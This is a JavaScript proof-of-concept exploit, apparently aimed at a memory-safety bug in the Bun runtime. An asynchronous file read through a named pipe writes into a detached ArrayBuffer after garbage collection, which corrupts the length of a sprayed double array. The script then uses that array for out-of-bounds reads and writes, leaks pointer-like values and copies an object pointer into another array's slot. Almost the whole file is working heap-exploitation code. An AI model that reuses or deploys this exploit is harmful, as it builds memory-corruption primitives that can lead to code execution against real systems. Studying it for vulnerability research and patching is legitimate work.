import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 32);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const writeOffset = Number(process.env.WRITE_OFFSET || 136);
const newLength = Number(process.env.NEW_LENGTH || 2048);
const oobScan = Number(process.env.OOB_SCAN || Math.max(0, newLength - slots - 4));
const sampleRun = Number(process.env.SAMPLE_RUN || 4);
const stopOnSuccess = process.env.STOP_ON_SUCCESS !== "0";
const path = join(tmpdir(), `bun-double-oob-object-transition-copy-${process.pid}`);
const retained = [];

const conv = new ArrayBuffer(8);
const convF64 = new Float64Array(conv);
const convU64 = new BigUint64Array(conv);
const doubleBase = 4096.25;
const doubleStride = 32;
const doubleScale = 4096;

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function f64ToU64(value) {
  convF64[0] = value;
  return convU64[0];
}

function u64ToF64(value) {
  convU64[0] = value;
  return convF64[0];
}

function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function isPointerLike(value) {
  return value >= 0x0000100000000000n && value <= 0x00007ffffffffffen && (value & 0x7n) === 0n;
}

function doubleValue(arrayIndex, elementIndex) {
  return doubleBase + arrayIndex * doubleStride + elementIndex / doubleScale;
}

function closeEnough(a, b) {
  return Math.abs(a - b) < 0.00000001;
}

function decodeDoubleValue(value) {
  if (typeof value !== "number" || !Number.isFinite(value)) return null;
  const delta = value - doubleBase;
  if (delta < 0) return null;

  const arrayIndex = Math.floor(delta / doubleStride);
  if (arrayIndex < 0 || arrayIndex >= retained.length) return null;

  const local = delta - arrayIndex * doubleStride;
  const elementIndex = Math.round(local * doubleScale);
  if (elementIndex < 0 || elementIndex >= slots) return null;
  if (!closeEnough(value, doubleValue(arrayIndex, elementIndex))) return null;

  return { arrayIndex, elementIndex };
}

function allocateDoubleArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = doubleValue(i, j);
    out.push({ type: "double", arrayIndex: i, arr });
  }
  return out;
}

function makeLengthPayload() {
  const payload = Buffer.alloc(8);
  payload.writeUInt32LE(newLength >>> 0, 0);
  payload.writeUInt32LE(newLength >>> 0, 4);
  return payload;
}

function findCorruptedDouble() {
  for (const entry of retained) {
    if (entry.arr.length !== slots) return entry;
  }
  return null;
}

function findDoubleOverlaps(source) {
  const overlaps = [];
  const maxRelative = Math.min(oobScan, Math.max(0, source.arr.length - slots - sampleRun));

  for (let relativeIndex = 0; relativeIndex <= maxRelative; relativeIndex++) {
    const decoded = decodeDoubleValue(source.arr[slots + relativeIndex]);
    if (!decoded || decoded.arrayIndex === source.arrayIndex) continue;
    if (decoded.elementIndex + sampleRun >= slots) continue;

    let matches = true;
    for (let k = 1; k < sampleRun; k++) {
      const actual = source.arr[slots + relativeIndex + k];
      const expected = doubleValue(decoded.arrayIndex, decoded.elementIndex + k);
      if (typeof actual !== "number" || !closeEnough(actual, expected)) {
        matches = false;
        break;
      }
    }

    if (matches) {
      overlaps.push({ relativeIndex, ...decoded });
      if (overlaps.length >= 16) break;
    }
  }

  return overlaps;
}

function summarizeValue(value) {
  if (typeof value !== "number") return { type: typeof value, string: String(value) };
  const bits = f64ToU64(value);
  return { type: "number", value, bits: hex(bits), pointerLike: isPointerLike(bits) };
}

function attemptObjectCopy(source, overlap, iteration) {
  const victim = retained[overlap.arrayIndex].arr;
  const sourceSlot = overlap.elementIndex;
  const destSlot = sourceSlot + 1;
  const sourceRelative = overlap.relativeIndex;
  const destRelative = sourceRelative + 1;
  const anchor = { kind: "bridge-anchor", iteration, victim: overlap.arrayIndex, slot: sourceSlot };
  const sentinel = { kind: "bridge-sentinel", iteration, victim: overlap.arrayIndex, slot: destSlot };

  victim[sourceSlot] = anchor;
  victim[destSlot] = sentinel;
  gcNow();

  const sourceSlotIsAnchorBeforeCopy = victim[sourceSlot] === anchor;
  const destSlotIsSentinelBeforeCopy = victim[destSlot] === sentinel;
  const leaked = source.arr[slots + sourceRelative];
  const leakedSummary = summarizeValue(leaked);
  let write = null;

  if (typeof leaked === "number") {
    const bits = f64ToU64(leaked);
    if (isPointerLike(bits)) {
      source.arr[slots + destRelative] = u64ToF64(bits);
      write = {
        sourceRelative,
        destRelative,
        copiedBits: hex(bits),
        afterIsAnchor: victim[destSlot] === anchor,
        afterIsSentinel: victim[destSlot] === sentinel,
        afterType: typeof victim[destSlot],
        afterKind: victim[destSlot]?.kind,
      };
    }
  }

  return {
    overlap,
    victimLength: victim.length,
    sourceSlotIsAnchorBeforeCopy,
    destSlotIsSentinelBeforeCopy,
    leaked: leakedSummary,
    write,
  };
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);
  view.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, view, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateDoubleArrays());
  gcNow();

  fs.writeSync(fd, makeLengthPayload(), 0, 8);
  const result = await done;
  const source = findCorruptedDouble();
  const overlaps = source ? findDoubleOverlaps(source) : [];
  const attempts = [];

  for (const overlap of overlaps.slice(0, 4)) {
    attempts.push(attemptObjectCopy(source, overlap, iteration));
    if (attempts.at(-1).write?.afterIsAnchor) break;
  }

  const summary = {
    iteration,
    size,
    sprayCount,
    slots,
    writeOffset,
    newLength,
    oobScan,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    source: source && {
      arrayIndex: source.arrayIndex,
      length: source.arr.length,
      first: source.arr[0],
      lastInBounds: source.arr[slots - 1],
    },
    overlaps,
    attempts,
  };

  console.log(JSON.stringify(summary));
  return attempts.some(attempt => attempt.write?.afterIsAnchor);
}

try {
  let successes = 0;
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      successes++;
      if (stopOnSuccess) break;
    }
  }
  console.log(JSON.stringify({ final: true, iterations, successes, stopOnSuccess }));
  process.exitCode = successes > 0 ? 86 : 1;
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
